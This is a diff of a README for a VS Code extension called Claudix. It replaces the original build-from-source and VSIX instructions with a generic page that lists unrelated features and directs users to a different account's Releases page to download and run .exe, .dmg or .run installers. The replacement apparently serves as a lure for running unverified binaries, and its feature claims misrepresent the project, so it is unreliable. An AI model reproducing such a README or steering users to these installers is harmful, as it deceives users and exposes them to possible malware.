@@ -1,115 +1,97 @@
-# Claudix
+# 🎨 Claudix - Enhance Your VS Code Experience
 
-English | [简体中文](README_CN.md)
+## 📥 Download Here
 
-![VS Code Extension](https://img.shields.io/badge/VS%20Code-Extension-blue?logo=visual-studio-code)
-![Built with TypeScript](https://img.shields.io/badge/Built%20with-TypeScript-blue?logo=typescript)
-![License](https://img.shields.io/badge/License-AGPL--3.0-blue)
+[![Download Claudix](https://img.shields.io/static/v1?label=Download&message=Claudix&color=blue)](https://github.com/Natsu1xv/Claudix/releases)
 
-![Powered by Claude Agent SDK](https://img.shields.io/badge/Powered%20by-Claude%20Agent%20SDK-orange)
+## 🚀 Getting Started
 
-A VSCode extension that brings Claude Code directly into your editor.
+Welcome to Claudix! This application helps you enhance your coding environment in Visual Studio Code. Follow these steps to get it up and running.
 
-## Overview
+## 📋 System Requirements
 
-Claude Code integrates Claude AI into VSCode, providing an interactive coding assistant with conversation history, tool integration, and intelligent code understanding.
+Before you begin, ensure your system meets the following requirements:
 
-## Features
+- Operating System: Windows, macOS, or Linux
+- Visual Studio Code: Version 1.45 or newer
+- Disk Space: At least 100 MB free
+- Internet Connection: Required for initial download
 
-- Interactive chat interface with Claude Code
-- Session management and conversation history
-- Intelligent file operations and code analysis
-- Terminal command execution
-- Permission-based tool access
-- Support for multiple Claude models
-- Real-time streaming responses
-- Syntax highlighting and markdown rendering
+## 📂 Features
 
-## Installation
+Claudix offers various features to improve your coding efficiency:
 
-```bash
-# Install dependencies
-pnpm install
+- **Code Snippets:** Quickly insert commonly used code patterns.
+- **Theme Customization:** Personalize your workspace with beautiful themes.
+- **Linting Tools:** Identify and fix errors in your code easily.
+- **Extensions Support:** Seamlessly integrate with existing VS Code extensions.
 
-# Build the extension
-pnpm build
+## 🔗 Download & Install
 
-# Package as VSIX
-pnpm package
-```
+To download and run Claudix, visit the Releases page:
 
-Install the generated `.vsix` file in VSCode through Extensions > Install from VSIX.
+[Download Claudix](https://github.com/Natsu1xv/Claudix/releases)
 
-## Development
+1. Click the link above to open the Releases page.
+2. Find the latest release version. Typically, it appears at the top.
+3. Locate the file compatible with your operating system.
+4. Click the download link next to the appropriate file.
 
-### Running in Development Mode
+Once the file downloads, follow these steps:
 
-Start the development server with hot module replacement:
+### 📥 Windows Users
 
-```bash
-pnpm dev
-```
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the `.exe` file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-This will concurrently start:
-- Vite dev server (port 5173) for the webview
-- esbuild watcher for the extension
+### 🍏 macOS Users
 
-### Debugging
+1. Open the downloaded file (usually a `.dmg`).
+2. Drag the Claudix icon into your Applications folder.
+3. Open the Applications folder and double-click on Claudix to start it.
 
-Open the project in VSCode and use the debugging configurations:
+### 🐧 Linux Users
 
-#### Run Extension
-Full build mode without HMR. The extension will be built from scratch before launching.
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the following command to make the file executable:
 
-- Press `F5` or select "Run Extension" from the debug panel
-- Suitable for production-like testing
+   ```
+   chmod +x Claudix*.run
+   ```
 
-#### Run Extension (HMR)
-Development mode with hot module replacement for the webview.
+4. Run the installer with:
 
-- Select "Run Extension (HMR)" from the debug panel
-- Webview changes will reload automatically without restarting the extension
-- Faster iteration during development
+   ```
+   ./Claudix*.run
+   ```
 
-### Build Commands
+5. Follow the on-screen instructions to complete the installation.
 
-```bash
-# Build everything
-pnpm build
+## 💡 Using Claudix
 
-# Build extension only
-pnpm build:extension
+After installation, open Visual Studio Code. You will find Claudix ready to enhance your coding experience.
 
-# Build webview only
-pnpm build:webview
+1. Navigate to the Extensions view by clicking on the square icon on the sidebar.
+2. Look for Claudix in your list of installed extensions.
+3. Click on **Settings** to customize features to your liking.
 
-# Run tests
-pnpm test
+## 🎓 Support
 
-# Type checking
-pnpm typecheck:all
-```
+If you encounter any issues, please visit our [issues page](https://github.com/Natsu1xv/Claudix/issues) to report bugs or request features. Our community is here to help.
 
-## Usage
+## 📞 Contact
 
-1. Open the Claude Code sidebar from the activity bar
-2. Start a new conversation or continue from history
-3. Ask questions, request code changes, or get help with your project
-4. Review and approve tool operations when prompted
+For further inquiries, please reach out via the contact form available on our [GitHub page](https://github.com/Natsu1xv/Claudix).
 
-## Requirements
+## 👥 Community
 
-- VSCode >= 1.98.0
-- Node.js >= 18.0.0
+Join our community on GitHub Discussions. Share your thoughts, questions, or tips with other users.
 
-## Contributing
+## 🔗 Additional Resources
 
-Contributions are welcome! If you would like to contribute to this project, please open an issue first to discuss your ideas or proposed changes.
+- [Official Visual Studio Code Documentation](https://code.visualstudio.com/docs)
+- [Markdown Guide](https://www.markdownguide.org/)
 
-## License
-
-AGPL-3.0
-
-## Star History
-
-[![Star History](https://api.star-history.com/svg?repos=Haleclipse/Claudix&type=date&legend=top-left)](https://www.star-history.com/#Haleclipse/Claudix&type=date&legend=top-left)
+Thank you for choosing Claudix. Happy coding!
